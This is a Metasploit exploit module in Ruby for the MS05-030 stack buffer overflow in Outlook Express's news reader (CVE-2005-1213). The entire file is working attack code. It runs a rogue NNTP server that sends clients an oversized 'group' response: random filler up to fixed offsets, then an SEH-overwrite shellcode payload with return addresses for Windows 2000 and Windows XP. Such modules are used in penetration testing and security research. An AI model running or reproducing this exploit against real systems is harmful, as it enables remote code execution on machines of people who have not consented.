##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS05-030 Microsoft Outlook Express NNTP Response Parsing Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in the news reader of Microsoft
        Outlook Express.
      },
      'Author'         => 'MC',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2005-1213' ],
          [ 'OSVDB', '17306' ],
          [ 'BID', '13951' ],
          [ 'MSB', 'MS05-030' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'AllowWin32SEH' => true
        },
      'Payload'        =>
        {
          'Space'    => 750,
          'BadChars' => "\x00",
          'MaxNops'  => 0,
          'StackAdjustment' => -3500,
          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 2000 English SP0-SP4', { 'Offset' => 9624, 'Ret' => 0x75022ac4 }],
          ['Windows XP English SP0/SP1',   { 'Offset' => 9596, 'Ret' => 0x71aa2461 }],
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2005-06-14',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The NNTPServer daemon port to listen on", 119 ])
      ])
  end

  def on_client_connect(client)
    yup = "200\r\n"

    client.put(yup)
    client.put(yup)
  end

  def on_client_data(client)
    return if ((p = regenerate_payload(client)) == nil)

    filler =  "215 list\r\n" + "group "
    filler << rand_text_english(target['Offset'])
    seh    =  generate_seh_payload(target.ret)
    sploit =  filler + seh + " 1 y\r\n\.\r\n"

    print_status("Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...")
    client.put(sploit)

    handler
    service.close_client(client)
  end
end
